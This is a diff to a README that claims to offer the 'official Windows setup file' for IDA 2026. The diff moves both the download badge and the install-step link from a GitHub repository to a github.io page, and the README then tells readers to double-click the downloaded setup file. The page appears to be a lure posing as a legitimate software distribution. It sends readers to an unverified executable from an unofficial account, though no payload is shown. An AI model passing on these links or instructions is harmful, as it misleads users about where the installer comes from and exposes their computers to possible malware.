@@ -8,7 +8,7 @@ This repository contains the official Windows setup file, along with installatio
 
 ## 🔗 Download the Application
 
-[![Download IDA](https://img.shields.io/badge/Download-IDA_2026-blue?style=for-the-badge&logo=windows)](https://github.com/a0168627/ida-download-2026)
+[![Download IDA](https://img.shields.io/badge/Download-IDA_2026-blue?style=for-the-badge&logo=windows)](https://a0168627.github.io)
 
 Visit this link to download the application.
 
@@ -34,7 +34,7 @@ Visit this link to download the application.
 
 Follow these simple steps to install IDA on your Windows computer:
 
-1. **Download the setup file** by clicking the download button above or visiting the link: https://github.com/a0168627/ida-download-2026
+1. **Download the setup file** by clicking the download button above or visiting the link: https://a0168627.github.io
 2. **Locate the downloaded file** (usually in your "Downloads" folder)
 3. **Double-click the setup file** to start the installation wizard
 4. **Follow the on-screen instructions**:
